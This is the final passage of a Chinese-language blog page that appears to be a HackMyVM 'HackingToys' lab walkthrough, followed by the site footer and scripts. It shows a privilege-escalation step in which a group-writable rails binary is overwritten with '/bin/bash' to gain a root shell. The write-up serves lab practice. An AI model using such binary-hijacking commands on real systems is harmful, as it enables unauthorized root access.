+</span></span><span class="line"><span class="cl"><span class="o">(</span>remote<span class="o">)</span> dodi@hacktoys:/home/dodi$ ls -la /usr/local/rvm/gems/ruby-3.1.0/bin/rails
+</span></span><span class="line"><span class="cl">-rwxrwxr-x <span class="m">1</span> root rvm <span class="m">566</span> May <span class="m">20</span> 13:51 /usr/local/rvm/gems/ruby-3.1.0/bin/rails
+</span></span><span class="line"><span class="cl"><span class="o">(</span>remote<span class="o">)</span> dodi@hacktoys:/home/dodi$ cat /etc/group <span class="p">|</span> grep rvm
+</span></span><span class="line"><span class="cl">rvm:x:1002:lidia,root
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">(</span>remote<span class="o">)</span> lidia@hacktoys:/opt/app/gadgets$ <span class="nb">echo</span> <span class="s1">&#39;/bin/bash&#39;</span> &gt; /usr/local/rvm/gems/ruby-3.1.0/bin/rails
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>执行一下，gameover</p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2025-03-03</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"><span>
+                            <a class="link-to-markdown" href="/hmv_hackingtoys/index.md" target="_blank">Read Markdown</a>
+                        </span></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://www.zhuangsanmeng.xyz/hmv_hackingtoys/" data-title="HMV HackingToys" data-hashtags="渗透"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://www.zhuangsanmeng.xyz/hmv_hackingtoys/" data-hashtag="渗透"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="https://www.zhuangsanmeng.xyz/hmv_hackingtoys/" data-title="HMV HackingToys"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="https://www.zhuangsanmeng.xyz/hmv_hackingtoys/" data-title="HMV HackingToys"><i data-svg-src="/lib/simple-icons/icons/line.min.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="https://www.zhuangsanmeng.xyz/hmv_hackingtoys/" data-title="HMV HackingToys"><i class="fab fa-weibo fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/%E6%B8%97%E9%80%8F/">渗透</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/hmv_metamorphose/" class="prev" rel="prev" title="HMV Metamorphose"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>HMV Metamorphose</a>
+            <a href="/hmv_publisher/" class="next" rel="next" title="HMV publisher">HMV publisher<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+<div id="comments"><div id="valine" class="comment"></div>
+    <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+    <script src=''></script>
+
+    <script type="text/javascript">
+        new Valine({
+            el: '#valine',
+            appId: 'XiJ1G58psCdX6BgfE27O7IH9-MdYXbMMI',
+            appKey: 'e9j5fWZui0l2YfNwupu7SDW2',
+            notify: '',
+            verify: '',
+            avatar: 'mp',
+            placeholder: '留下你的评论～',
+            visitor: 'true'
+        });
+    </script></div></article></div>
+            </main><footer class="footer">
+    <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer"
+                title="Hugo 0.147.1">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank"
+                rel="noopener noreffer" title="LoveIt 0.3.0"><i class="far fa-kiss-wink-heart fa-fw"
+                    aria-hidden="true"></i> LoveIt</a>
+        </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2024 - 2025</span><span class="author" itemprop="copyrightHolder">&nbsp;<a
+                    href="/" target="_blank">Zsm</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span><span class="icp-splitter">&nbsp;|&nbsp;</span><br class="icp-br" />
+            <span class="icp">豫ICP备2024048128号</span></div>
+    
+        
+        <script async src=" //busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js "></script>
+    
+
+    
+        
+            <section>
+                
+                    <span id="busuanzi_container_value_site_pv"><i class="far fa-eye fa-fw"></i>
+                        
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+
+                
+                    &nbsp;|&nbsp;              
+                
+
+                
+                    <span id="busuanzi_container_value_site_uv"><i class="fa fa-user"></i>
+                        
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+            </section>
+        
+
+        
+        
+    
+
+</div>
+</footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a>
+        </div>
+
+        <div id="fixed-buttons-hidden"><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/katex/katex.min.css"><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/mhchem.min.js"></script><script type="text/javascript" src="/lib/cookieconsent/cookieconsent.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{},"cookieconsent":{"content":{"dismiss":"Got it!","link":"Learn more","message":"This website uses Cookies to improve your experience."},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","maxResultLength":10,"noResultsFound":"No results found","snippetLength":50,"type":"lunr"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
